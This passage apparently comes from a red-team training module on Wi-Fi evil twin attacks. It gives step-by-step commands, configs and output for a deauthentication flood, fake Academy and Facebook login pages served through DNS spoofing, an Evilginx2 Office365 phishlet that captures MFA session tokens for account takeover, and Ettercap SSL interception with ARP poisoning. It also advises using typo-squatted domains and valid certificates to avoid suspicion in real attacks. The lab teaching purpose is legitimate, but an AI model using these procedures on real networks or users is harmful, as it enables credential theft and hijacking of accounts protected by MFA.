[+] sniffkin3 -> hexdump    activated

```

To force victims to join our rogue access point, we can perform a deauthentication attack on the legitimate access point. This will disconnect any currently connected clients, prompting them to reconnect, and if the rogue access point has the same SSID, clients will likely try to connect to it.

To do this, we can use `aireplay-ng` to send deauthentication packets.

```shell
aireplay-ng --deauth 0 -a 9C:9A:03:39:BD:7A wlan0mon

21:24:51  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
21:24:52  Sending DeAuth (code 7) to broadcast -- BSSID: [9C:9A:03:39:BD:7A]
21:24:52  Sending DeAuth (code 7) to broadcast -- BSSID: [9C:9A:03:39:BD:7A]
21:24:53  Sending DeAuth (code 7) to broadcast -- BSSID: [9C:9A:03:39:BD:7A]
21:24:54  Sending DeAuth (code 7) to broadcast -- BSSID: [9C:9A:03:39:BD:7A]
21:24:54  Sending DeAuth (code 7) to broadcast -- BSSID: [9C:9A:03:39:BD:7A]

```

When victims connect to our rogue access point and attempt to visit academy.hackthebox.com, they will be redirected to the phishing page hosted locally on our machine. If the victim enters their credentials on this page, the entered data will be captured and logged.

These credentials will be visible directly in the wifipumpkin3 interface under its session or log details. Additionally, they will be stored in the `pass.htm` file located in the /var/www/html directory aswell.

```shell
wp3 >  [  pydhcp_server  ] 21:25:26  - RECV from ('0.0.0.0', 68):
::Body::
	[X][012] hostname: 'client'
	[ ][050] requested_ip_address: IPv4Address('192.168.1.23')
	[-][053] dhcp_message_type: DHCP_DISCOVER
	[-][055] parameter_request_list: 012:hostname, 053:dhcp_message_type

 [  sniffkin3  ] 21:25:31  - [ 10.0.0.21 > 10.0.0.1 ] GET academy.hackthebox.com/
 [  sniffkin3  ] 21:25:31  - [ 10.0.0.21 > 10.0.0.1 ] POST academy.hackthebox.com/data.php
                     payload: _token=dLLTAsNEev8Lsnvedo0wsqk1KrRzfzMrjLkpE9IZ&email=<SNIP>&password=<SNIP>
                     Username: <SNIP>
                     Password: <SNIP>

```

### Spoofing Multiple Domains

To spoof multiple domains, multiple phishing pages must be hosted under separate directories within `/var/www/html`, served by the `Apache` server. For example, to add a phishing page for `Facebook` alongside `Academy`, a new directory such as `/var/www/html/facebook` can be created. The [phishing page contents](https://github.com/seeratawan01/Facebook-Responsive-Phishing-Page) for Facebook should then be placed inside this directory.

To configure Apache for handling multiple phishing pages, virtual hosts (vhosts) must be set up locally. This allows Apache to serve the appropriate phishing page based on the requested domain.

1. `Setting up Academy vhost`

Create the file `/etc/apache2/sites-available/intranet1.conf` with the following content:

```configuration
<VirtualHost *:80>
    ServerAdmin [email protected]
    ServerName academy.hackthebox.com
    ServerAlias www.academy.hackthebox.com
    DocumentRoot /var/www/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

This configuration ensures that requests for academy.hackthebox.com are served from /var/www/html.

1. `Setting up Facebook vhost`

Create the file `/etc/apache2/sites-available/intranet2.conf` with the following content:

```configuration
<VirtualHost *:80>
    ServerAdmin [email protected]
    ServerName facebook.com
    ServerAlias www.facebook.com
    DocumentRoot /var/www/html/facebook
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

This ensures that requests for facebook.com are served from /var/www/html/facebook.

After creating these files, we need to enable the vhosts by running the following commands:

```shell
sudo a2ensite intranet1.conf
sudo a2ensite intranet2.conf
sudo systemctl restart apache2

```

After configuring Apache with the virtual hosts for multiple phishing pages, the same process used for single-domain spoofing in `Wifipumpkin3` can be applied. However, the domains parameter should now include multiple domains as shown below.

```shell
wp3 > use spoof.dns_spoof
wp3 : dns_spoof > set domains academy.hackthebox.com,facebook.com
wp3 : dns_spoof > set redirectTo 10.0.0.1
wp3 : dns_spoof > start

[*] DnsSpoof attack
===================

[*] Redirect to: 10.0.0.1

[*] Targets:
============

[*] -> [academy.hackthebox.com]
[*] -> [facebook.com]
wp3 : dns_spoof > back

```

When victims connect to our rogue access point and attempt to visit academy.hackthebox.com or facebook.com, they will be redirected to their respective phishing pages hosted locally on our machine. If the victim enters their credentials, the entered data will be captured and logged.

```shell
wp3 >  [  pydhcp_server  ] 21:25:26  - RECV from ('0.0.0.0', 68):
::Body::
	[X][012] hostname: 'client'
	[ ][050] requested_ip_address: IPv4Address('192.168.1.23')
	[-][053] dhcp_message_type: DHCP_DISCOVER
	[-][055] parameter_request_list: 012:hostname, 053:dhcp_message_type

 [  sniffkin3  ] 21:42:21  - [ 10.0.0.21 > 10.0.0.1 ] GET facebook.com/
 [  sniffkin3  ] 21:42:21  - [ 10.0.0.21 > 10.0.0.1 ] POST facebook.com/data.php
                     payload: username=<SNIP>&userpassword=<SNIP>&data=Log+In
                     Username: <SNIP>
                     Password: <SNIP>

 [  sniffkin3  ] 21:42:22  - [ 10.0.0.21 > 10.0.0.1 ] GET academy.hackthebox.com/
 [  sniffkin3  ] 21:42:22  - [ 10.0.0.21 > 10.0.0.1 ] POST academy.hackthebox.com/data.php
                     payload: _token=dLLTAsNEev8Lsnvedo0wsqk1KrRzfzMrjLkpE9IZ&email=<SNIP>&password=<SNIP>
                     Username: <SNIP>
                     Password: <SNIP>

```


# Bypassing MFA with Evilginx2

* * *

In this section, we explore how to use `Wifipumpkin3` in combination with `Evilginx2` to execute a [phishing attack](https://wifipumpkin3.github.io/2024/Wifipumpkin3-evilginx2-Microsoft365-Captive-Portal-Login-Attack/) and bypass Multi-Factor Authentication (MFA). By leveraging a rogue access point and a transparent reverse proxy, we can intercept authentication flows, capture credentials, and extract valid session tokens. This technique enables an attacker to gain unauthorized access to target accounts without needing the victim’s second-factor authentication, making it a powerful approach in Wi-Fi red teaming operations.

We explore how leveraging a Linux host with Wifipumpkin3 and Evilginx2 provides a highly versatile, flexible, and portable solution for Wi-Fi red teaming. This setup can be deployed on a Raspberry Pi, allowing for remote execution and long-term persistence in target environments. By placing the device as a site implant inside a target building, it can operate covertly and be retrieved later. Additionally, C2 (Command and Control) capabilities can be integrated to exfiltrate captured credentials and session tokens in real time, enabling remote access to the compromised data without requiring physical retrieval.

This configuration allows for the most customization at all stages, with the caveat of being the most technically complex. In short, the concept involves using the following tools:

- `Wifipumpkin3` \- WiFi exploitation framework, creates an access point with an SSID which clients will connect to. Requires monitor-mode WLAN hardware interface.
- `Phishkin3` \- Part of the Wifipumpkin3 framework. Serves as a proxy, redirecting all traffic from the client to the Evil Portal hosted on the Evilginx2 server, instead of its desired destination.
- `Evilginx2` \- Hosts the Evil Portal and handles the MFA bypass mechanism.

The interaction between these three elements of the attack chain can be explained with this diagram:

![Wifipumpkin3 + Evilginx2 Operation](https://academy.hackthebox.com/storage/modules/291/13/S1S0.png)

* * *

Simplification of the attack:

1. The victim host connects to the attacker's rogue AP but is blocked from reaching the intended web page or accessing the internet.
2. The captive portal is delivered by the `Phishkin3` built-in proxy, which is part of the `Wifipumpkin3` framework. This proxy controls internet access for the victim host, ensuring that their connectivity remains restricted until the authentication flow is completed. Once the victim submits their credentials and the final redirect request is successfully sent to the attacker host at `http://{attacker_IP}:8080/auth/finish`, their access to the internet is restored.
3. After the initial connection request from the victim host reaches the `Phishkin3` proxy, it responds with an `HTTP 302: Redirect`, guiding the victim to the phishing page hosted at `http://{attacker_IP}:8080/verify`. This phishing page is served by the `Evilginx2` service running on the attacker’s host.
4. The victim host follows the redirect and requests the phishing login page from the `Evilginx2` service.
5. The attacker host delivers the phishing page hosted at `http://fakedomain:8080/`
6. The user logs in using their credentials and completes the MFA challenge.
7. The attacker captures the victim's login credentials and MFA challenge response.
8. The attacker sends the victim an HTTP 302 redirect to `http://{attacker_IP}/auth/finish` and the `Phishkin3` proxy grants internet access permission.
9. Upon receiving access to the internet, the `Evilginx2` service redirects the victim to the legitimate website, where they retain the authentication cookies to access the legitimate resource directly.

There could be an additional step where Microsoft would mark the login as suspicious and would request an additional factor of identity confirmation. If the initial MFA method is a two-digit code confirmation, the second one could be an SMS OTP, which is also captured by Evilginx2.

* * *

# Configuration

### Wifipumpkin3 Configuration

When the AP is created, a Python DHCP server is started. We need to ensure the gateway IP and the subnet are the same as the ones that will be configured on `Evilginx2`. First, we issue the `dhcpconf 1` command to select the configuration with ID `1`. By default, this gives us a suitable IP range class B with the gateway IP address set to `172.16.0.1`. We then issue the same command without the parameter in order to display the current configuration.

```shell
wp3 > dhcpconf 1

wp3 > dhcpconf

[*] DHCP Server Option:
=======================

   Id | Class   | IP address range            | Netmask       | Router
------+---------+-----------------------------+---------------+-------------
    0 | A       | 10.0.0.20/10.0.0.50         | 255.0.0.0     | 10.0.0.1
    1 | B       | 172.16.0.100/172.16.0.150   | 255.240.0.0   | 172.16.0.1
    2 | C       | 192.168.0.100/192.168.0.150 | 255.255.255.0 | 192.168.0.1

[*] DHCP Server Settings:
=========================

 broadcast=172.16.0.255
 classtype=A
 leasetimeDef=600
 leasetimeMax=7200
 netmask=255.240.0.0
 range=172.16.0.100/172.16.0.150
 router=172.16.0.1
 subnet=172.16.0.0

```

Since the Wifipumpkin3 AP is acting as a router with DHCP and DNS services enabled, the `172.16.0.1` address will be used to configure our `/etc/hosts` file later on, as well as Evilginx2 itself, during the DNS service configuration stage. Note that the IP subnet can be customized to whatever values we prefer, and this particular subnet is only used for demonstration purposes.

The rest of the configuration for Wifipumpkin3 will be made using a `.pulp` configuration file after we've finalized the setup of Evilginx2, as a lot of the AP settings will be dependent on our phishing scenario.

* * *

### Evilginx2 Configuration

[Evilginx2](https://github.com/kgretzky/evilginx2) is a standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies and allowing for the bypass of multi-factor authentication. Essentially, it's a custom version of `nginx HTTP server` enabling man-in-the-middle functionality to act as a proxy between a victim's browser and phished website.

We are aiming to use it to deploy an Office365 Outlook login for a target user with multi-factor authentication enabled on their account, and then redirect them to the official login page to avoid raising suspicion.

Evilginx2 can be installed with `apt` through the following command:

```shell
sudo apt install evilginx2

```

* * *

If the `apt` method is not available, building it from source is very straight-forward.
Requirements for building:

- [Golang](https://go.dev/doc/install) version `1.18 or above`.
- Optional: [Node.js](https://nodejs.org/en/download/) version `14.17.0 or above`. You can use [nvm](https://github.com/nvm-sh/nvm) for managing multiple Node versions on a single machine. Node.js is only required for running `Evilpuppet`, which is outside the scope of this section.

Prerequisites can be installed using the following commands:

```shell
sudo apt install golang-go nodejs

```

We can install Evilginx2 using the following commands:

```shell
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make

```

We can test for a successful installation by running the initialization commands. This will create a `phishlets` folder inside `build`, where the phishlets can be stored.

```shell
./evilginx2 -p phishlets

```

If you've installed Evilginx2 using \`apt\`, your phishlets directory will be located in \`/usr/share/evilginx2/phishlets\`. Alternatively, you will need to specify the location of the phishlets directory when launching Evilginx2 using the \`-p {phishlets\_location}\` parameter, as seen above. Any new phishlets should always be installed in the appropriate directory, respective to your installation method. Moving forward, all commands will be based around the \`apt\` installation method, with the \`/usr/share/evilginx2/phishlets\` directory being the one used to store the phishlets.

* * *

There are a few more parameters we need to set for the Evilginx2 server before we move forward. From the output above, we can see that it lacks a bind IPv4 address and our fake domain. The IPv4 address should be the same as the one selected in Wifipumpkin3 as the `router` address. These requirements can be set using the following commands:

```shell
: config domain fakedomain.com
: config ipv4 external 172.16.0.1
: config ipv4 bind 172.16.0.1

: config

 domain             : fakedomain.com
 external_ipv4      : 172.16.0.1
 bind_ipv4          : 172.16.0.1
 https_port         : 443
 dns_port           : 53
 unauth_url         :
 autocert           : on
 gophish admin_url  :
 gophish api_key    :
 gophish insecure   : false

```

We can also verify these configurations at any point by reading the `~/.evilginx2/config.json` file for Evilginx2 inside of its hidden home directory. Knowing how to find and work with this file allows for easy deployments at any time by simply copying the desired configuration file into the `~/.evilginx2/` directory, overwriting the outdated one.

```json
{
  "blacklist": {
    "mode": "unauth"
  },
  "general": {
    "autocert": true,
    "bind_ipv4": "172.16.0.1",
    "dns_port": 53,
    "domain": "fakedomain.com",
    "external_ipv4": "172.16.0.1",
    "https_port": 443,
    "ipv4": "",
    "unauth_url": ""
  },
  "phishlets": {}
}

```

* * *

### Phishlet Configuration

`Phishlets` are phishing pages that can easily be set up by the attacker for use with Evilginx2. They are configured using `.yaml` files, an example of which can be seen below:

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true}
sub_filters:
  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
auth_tokens:
  - domain: '.academy.breakdev.org'
    keys: ['cookie_name']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'academy.breakdev.org'
  path: '/evilginx-mastery'

```

`Evilginx2 v3.3.0` does not come with any pre-installed phishlets, so we need to obtain them manually. For this demonstration, we will set up an Office365 Outlook login phishlet. An existing `.yaml` configuration file for this can be found [here](https://raw.githubusercontent.com/An0nUD4Y/Evilginx2-Phishlets/refs/heads/master/outlook(o365).yaml).

Alternatively, we can write our own phishlet based on any website we want to convert into a phishlet. Documentation on the structure and syntax of phishlet files can be found [here](https://help.evilginx.com/community/phishlet-format).

```shell
cd /usr/share/evilginx2/phishlets

wget https://raw.githubusercontent.com/An0nUD4Y/Evilginx2-Phishlets/refs/heads/master/outlook(o365).yaml

mv outlook(o365).yaml o365.yaml && cat o365.yaml

[..SNIP..]

proxy_hosts:

  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true}

  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}

  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false}

[..SNIP..]

```

Once the phishlet is added to the correct directory, we need to instruct Evilginx2 to make use of it. Associating it with the attacker-controlled domain will automatically prompt Evilginx2 to generate all the TLS certificates it requires to operate successfully. We will skip this step using the `-developer` parameter upon launch, since the domain `fakedomain.com` does not exist, and TLS certificates can therefore not be generated for it.

```shell
evilginx2 -developer

[..SNIP..]

: phishlets hostname o365 fakedomain.com

[15:22:47] [inf] phishlet 'o365' hostname set to: fakedomain.com
[15:22:47] [inf] disabled phishlet 'o365'

: phishlets enable o365

: phishlets

+-----------+-----------+-------------+-----------------+-------------+
| phishlet  |  status   | visibility  |    hostname     | unauth_url  |
+-----------+-----------+-------------+-----------------+-------------+
| example   | disabled  | visible     |                 |             |
| o365      | enabled   | visible     | fakedomain.com  |             |
+-----------+-----------+-------------+-----------------+-------------+

```

* * *

### Lure Configuration

`Lures` are essentially pre-generated phishing links, which we will be sending out on our engagements. Evilginx2 provides multiple options to customize our lures. For our scenario, we will be creating `o365`, containing a `redirect_url` parameter which will redirect the user from the attacker address at `http://172.16.0.1/verify` to our phishlet at `https://login.fakedomain.com/{path}`. The `{path}` is randomly generated and serves to identify and track progress for unique users accessing the phishlet.

```shell
: lures create o365

[16:28:32] [inf] created lure with ID: 0

: lures edit 0 redirect_url "http://172.16.0.1:8080/verify"

[21:24:13] [inf] redirect_url = 'http://172.16.0.1:8080/verify'

: lures

+-----+-----------+-----------+------------+-------------+-------------------------------+---------+------+
| id  | phishlet  | hostname  |   path     | redirector  |   redirect_url                | paused  |  og  |
+-----+-----------+-----------+------------+-------------+-------------------------------+---------+------+
| 0   | o365      |           | /vISVhLCE  |             | http://172.16.0.1:8080/verify |         | ---- |
+-----+-----------+-----------+------------+-------------+-------------------------------+---------+------+

```

Once done, we can consider the Evilginx2 configuration complete.

* * *

### DNS Service Configuration

Because our evil AP will be acting as the gateway and a DNS service, we will be creating entries for the phishing domain locally, with values that are inserted into `/etc/hosts` on the attacker host. Any domain will work here, for demonstration purposes, but keep in mind the real attack should be run on an attacker-owned domain using typo-squatting to mimic a real service.

The subdomain entries we add for each new line are dependent on our `o365.yaml` file entries, under the `proxy_hosts` field visible in the paragraph above. All of the entries there will need to be present in our `/etc/hosts` file. The corresponding IPv4 address will always be the `router` address assigned initially on Wifipumpkin3.

```shell
cat /etc/hosts

127.0.0.1       localhost

[..SNIP..]

# Wi-Fi Evil Twin Attacks module domain
172.16.0.1      outlook.fakedomain.com
172.16.0.1      login.fakedomain.com
172.16.0.1      account.fakedomain.com
172.16.0.1      *.fakedomain.com

[..SNIP..]

```

* * *

### Pulp Configuration

`Pulps` are automated scripts that run inside of `Wifipumpkin3` and help set it up from scratch using a singular `.pulp` file. The script syntax is simply the same as the commands we would issue manually inside of Wifipumpkin3, chained together to generate a fully programmatic environment setup experience. We can have multiple different pulps depending on the type of engagement we are preparing for, and simply instruct Wifipumpkin3 on which one to use during initialization.

In order for the attack cycle to be complete, we must also set up the DNS spoof attack within Wifipumpkin3, according to our DNS configuration from before, so that in the resolution process, all requests for the fake resource are linked to the address 172.16.0.1, therefore redirected to the Evilginx2 HTTP server.

Having configured the Evilginx2 server, we can add all of the manual Wifipumpkin3 configuration parameters to the `.pulp` file.

```pulp
set interface wlan1
set ssid HTB-Corp
dhcpconf 1
set proxy phishkin3 true
set phishkin3.cloud_url_phishing https://outlook.fakedomain.com/vISVhLCE
set phishkin3.proxy_port 8080
set phishkin3.redirect_url_after_login https://outlook.live.com/mail
set phishkin3.allow_user_login_endpoint /verify
use spoof.dns_spoof
add login.fakedomain.com
add account.fakedomain.com
add outlook.fakedomain.com
add *.fakedomain.com
set redirectTo 172.16.0.1
start
back
start

```

- `interface` \- Select the WLAN interface as output in the `ifconfig` output.
- `ssid` \- Select the preferred network AP name to be advertised to the victim.
- `phishkin3.cloud_url_phishing` \- Input the randomly generated ID as seen in the `lures > path` column in Evilginx2.
- `phishkin3.redirect_url_after_login` \- Input the real resource the user would expecting to access after login.
- `phishkin3.allow_user_login_endpoint` \- Input the same page name as seen in the `lures > redirect_url` column in Evilginx2.
- Make sure to add all the subdomains configured in `/etc/hosts` under the `spoof.dns_spoof` service.
- `redirectTo` \- Select the IPv4 address configured for the `router` in Wifipumpkin3 initially.

Once saved, we can apply the pulp to the Wifipumpkin3 initialization with the following command:

```shell
sudo wifipumpkin3 -p evilginx_config.pulp

[..SNIP..]

[*] plugin: evilginx_config.pulp
================================

[*] DnsSpoof attack
===================

[*] Redirect to: 172.16.0.1

[*] Targets:
============

[*] -> [login.fakedomain.com]
[*] -> [account.fakedomain.com]
[*] -> [outlook.fakedomain.com]
[*] -> [*.fakedomain.com]
[*] module: dns_spoof running in background
[*] use jobs command displays the status of jobs started
[+] enable forwarding in iptables...
[*] sharing internet connection with NAT...
[*] setting interface for sharing internet: None
[*] settings for Phishkin3 portal:
[*] allow FORWARD UDP DNS
[*] allow traffic to Phishkin3 captive portal
[*] block all other traffic in access point
[*] redirecting HTTP traffic to captive portal
[+] starting hostpad pid: [25487]
wp3 > [+] hostapd is running
[*] starting pydhcp_server
[+] starting phishkin3 pid: [25492]
[*] starting sniffkin3 port: [80, 8080]
[+] sniffkin3 -> ftp        activated
[+] sniffkin3 -> emails     activated
[+] sniffkin3 -> httpCap    activated
[+] sniffkin3 -> kerberos   activated
[+] sniffkin3 -> hexdump    activated

[..SNIP..]

 * Running on http://172.16.0.1:8080

```

* * *

# Launching the attack

This demonstration attack leverages a Wifipumpkin3 evil portal to redirect victims to an Evilginx2 phishing page mimicking an Office 365 Outlook login. While this exact scenario may not be entirely realistic, it effectively illustrates how authentication tokens are handled within the attack chain. Once the victim logs into the phishing page, their authentication is seamlessly forwarded to the legitimate Outlook web app, granting them access without requiring an additional login. This showcases the power and effectiveness of session hijacking in modern phishing attacks.

To prevent the use of a real phishing domain during testing, the `-developer` option is enabled in Evilginx2. This disables automatic TLS certificate generation for `fakedomain.com`, but as a result, users will encounter an untrusted website warning in their browsers. In a real-world attack, an attacker-controlled domain with a valid TLS certificate should be used, and the `-developer` option should be turned off to avoid raising suspicion. Below, we showcase both perspectives of the attack, in a step-by-step manner.

The order in which we start each service is crucial since `Evilginx2` has a built-in DNS service that is not needed in this setup. To prevent Evilginx2 from running its DNS service, we must start `Wifipumpkin3` first. This ensures that `dns_spoof` within Wifipumpkin3 advertises the configured DNS records for `fakedomain.com` through the rogue AP, directing victims to the phishing page without interference.

We begin by creating the rogue AP using `Wifipumpkin3` and the `.pulp` configuration file. This will spawn the AP, start up the DHCP and DNS spoofing services, and await connections from potential victims.

![Wifipumpkin3 Initialization](https://academy.hackthebox.com/storage/modules/291/13/S13S1-new.gif)

Once `Wifipumpkin3` is started, we can launch `Evilginx2`, which will spin up the redirector and the phishing page.

![Evilginx2 Initialization](https://academy.hackthebox.com/storage/modules/291/13/S13S2-new.gif)

Immediately after `Wifipumpkin3` is launched, the victim can see the rogue AP and connect to it successfully. During a successful attack chain, the evil portal would pop up with the crafted authentication page.

![Victim AP Connection](https://academy.hackthebox.com/storage/modules/291/13/S13S3-new.gif)

Once connected, they will be met with a fake Office365 login page, TLS errors aside.

![Victim Phishing Page](https://academy.hackthebox.com/storage/modules/291/13/S13S5.gif)

On the attacker's side, `Evilginx2` will output that a new client has appeared and has accessed the lure path.

![Attacker Evilginx2 Connect](https://academy.hackthebox.com/storage/modules/291/13/S13S4.gif)

The victim is convinced to input their credentials and proceed with login. At this point in time, the only lead they have on the existence of the phishing attack is the typo-squatted URL of the attacker's domain.

![Victim Login](https://academy.hackthebox.com/storage/modules/291/13/S13S6.gif)

In turn, `Evilginx2` will remark that they have been captured successfully, and outputs their values in the terminal.

![Attacker Evilginx2 Login](https://academy.hackthebox.com/storage/modules/291/13/S13S7.gif)

Due to the victim's account security settings, MFA is enforced, prompting them to verify the login on their phone. Once they confirm their identity, they are redirected to the legitimate Outlook web app, with their authentication tokens proxied through the attacker's infrastructure.

![Victim Outlook](https://academy.hackthebox.com/storage/modules/291/13/S13S8.gif)

`Evilginx2` reports having captured the tokens from the MFA authentication. These can be used later using the `sessions` command.

![Attacker Tokens](https://academy.hackthebox.com/storage/modules/291/13/S13S9.gif)

The attack chain is now complete. The attacker opens a browser window locally and navigates to the legitimate Office365 Outlook web-app login page. As we can see in the screen capture, they are not authenticated yet.

![Victim Phishing Page](https://academy.hackthebox.com/storage/modules/291/13/S13S10.gif)

The attacker uses the `sessions` command to output the JSON values for the victim's session. This is then copied and pasted over in their browser.

![Victim Phishing Page](https://academy.hackthebox.com/storage/modules/291/13/S13S11.gif)

Add-ons such as [CookieEditor](https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?pli=1) allow the attacker to remove their current cookies and paste in the JSON value taken from `Evilginx2`. Revisiting the page at its legitimate address, `login.live.com`, now authenticated the attacker using the victim's session.

![Victim Phishing Page](https://academy.hackthebox.com/storage/modules/291/13/S13S12.gif)

* * *

## Limitations

This attack is not effective against accounts secured with physical authentication tokens, such as Yubikeys, because these devices establish a direct handshake with the victim’s device, making interception over the network impossible.

Additionally, depending on the OS patch level of the target device, issues with connection trust may arise. In such cases, the victim may see an error message stating: "This connection is untrusted," preventing communication with the Evilginx2 service.

Another challenge is that major companies like Microsoft and Google continuously implement mitigations to disrupt reverse proxy-based phishing attacks. A common issue is encountering a blank screen instead of the login page. These mitigations often rely on JavaScript protections and require debugging the proxy to remove them, bypassing subdomain validation checks performed by the victim's browser.

Ultimately, many OS-level and browser-based limitations can be mitigated by deploying a phishing infrastructure in the cloud with properly configured SSL. This approach helps avoid various connection trust issues and enhances the effectiveness of the attack.


# SSL Interception

* * *

SSL interception, also known as `SSL/TLS interception` or `HTTPS interception`, is the process of intercepting and decrypting encrypted SSL/TLS traffic. This is typically done to inspect, modify, or monitor the traffic before re-encrypting it and forwarding it to its destination. It is commonly used for both legitimate and malicious purposes.

![sslintercept](https://academy.hackthebox.com/storage/modules/291/ettercap/sslintercept.png)

* * *

## How SSL Interception Works?

The attacker/interceptor acts as a "man in the middle" by creating two separate secure connections: One between the client and the interceptor. Another between the interceptor and the intended destination (e.g., a website). The interceptor decrypts the traffic received from the client, processes it (e.g., inspects or modifies it), and then re-encrypts it before forwarding it to the destination server. However, the success of this technique relies on the client accepting a self-signed certificate issued by the attacker when accessing the site.

In this section, we will utilize the [Ettercap](https://github.com/Ettercap/ettercap) tool to perform SSL Interception. Ettercap offers three methods to bypass HTTPS security:

1. `SSL Interception`: The client must accept a self-signed or untrusted certificate.
2. `SSL Stripping`: The `sslstrip` plugin downgrades HTTPS connections to HTTP, removing the encryption.
3. `DNS Spoofing and Redirection`: Redirects the client to a web server controlled by the attacker. However, similar to SSL interception, the client must accept the self-signed or untrusted certificate for this method to work.

* * *

## Performing the Attack

Before initiating SSL Interception, we must establish a Man-in-the-Middle (MiTM) position. This can be achieved by setting up an open rogue access point to which clients connect.

### Spin up the Fake Access Point

To start a fake access point, we first need to configure routing by setting up a DNS and DHCP server. This ensures that connected clients can resolve domain names and obtain IP addresses for seamless connectivity.

To configure the routing correctly, we need set up DNS and DHCP for the fake network and assign a valid IP address to the wireless interface.

We can use `dnsmasq` to configure DNS and DHCP for the `wlan1` interface. To get started, we need to create a `dns.conf` file with the following contents:

```configuration
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries

```

The next step is to configure the valid IP address for the interface that will host the fake access point ( `wlan1`).

```shell
sudo ifconfig wlan1 192.168.0.1/24
ifconfig wlan1
wlan1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Now we can start dnsmasq with the following command:

```shell
sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 127.0.0.53#53
dnsmasq: read /etc/hosts - 7 names

```

Additionally, we need to ensure that IP forwarding is enabled on the machine to allow proper routing of traffic between the fake access point and the internet.

```shell
echo 1 > /proc/sys/net/ipv4/ip_forward

```

To create an open rogue AP, we can use the following configuration file for hostapd. This configuration sets up an open network (no encryption) to entice clients to connect:

```configuration
interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211

```

Save the above configuration in a file (e.g., `hostapd.conf`) and start the AP with:

```shell
hostapd hostapd.conf

rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED

```

Once clients connect to our rogue access point, we successfully establish a Man-in-the-Middle (MiTM) position, allowing us to perform SSL interception.

```shell
wlan1: AP-ENABLED
wlan1: STA 02:00:00:00:03:00 IEEE 802.11: authenticated
wlan1: STA 02:00:00:00:03:00 IEEE 802.11: associated (aid 1)
wlan1: AP-STA-CONNECTED 02:00:00:00:03:00
wlan1: STA 02:00:00:00:03:00 RADIUS: starting accounting session A600B23A5C47DB36
wlan1: STA 02:00:00:00:04:00 IEEE 802.11: authenticated
wlan1: STA 02:00:00:00:04:00 IEEE 802.11: associated (aid 2)
wlan1: AP-STA-CONNECTED 02:00:00:00:04:00
wlan1: STA 02:00:00:00:04:00 RADIUS: starting accounting session EEAD63CD42D1F21A

```

* * *

### SSL Interception Using GUI

To intercept SSL connections, we can use `Ettercap`. The tool can be launched with its graphical user interface (GUI) for simplicity. Below is an example screenshot of opening Ettercap's UI.

![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/001.PNG)

Once Ettercap is launched, select the `wlan1` interface, which is being used for the rogue AP where clients are connected. Then, click on the `tick mark` icon at the top to proceed.

![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/002.PNG)

After selecting the interface, click on the `Scan for Hosts` button at the top. This will scan the network for available hosts, specifically the clients connected to the `wlan1` access point.

![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/003.PNG)

Once the scan is complete, click on the `Hosts List` option to view the available hosts. Here, we can see two clients connected to the rogue AP on the wlan1 interface.

![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/004.PNG)![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/005.PNG)

Next, to intercept SSL connections, we ensure that the HTTPS service is added. To verify this, we click on `SSL Intercept` and confirm that the `HTTPS` service is listed for IPv4. This is usually enabled by default.

![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/006.PNG)![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/007.PNG)

Finally, we initiate ARP Poisoning without specifying a particular target. This ensures that all hosts in the list are selected automatically.

![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/008.PNG)![ettercap](https://academy.hackthebox.com/storage/modules/291/ettercap/009.PNG)

Once SSL Intercept is enabled, clients visiting an SSL-secured website will be prompted to accept a self-signed certificate generated by Ettercap. If the client accepts the certificate and enters their credentials, those credentials will be captured in the Ettercap logs. The effectiveness of this technique hinges on the client’s willingness to accept the self-signed certificate when accessing the site.

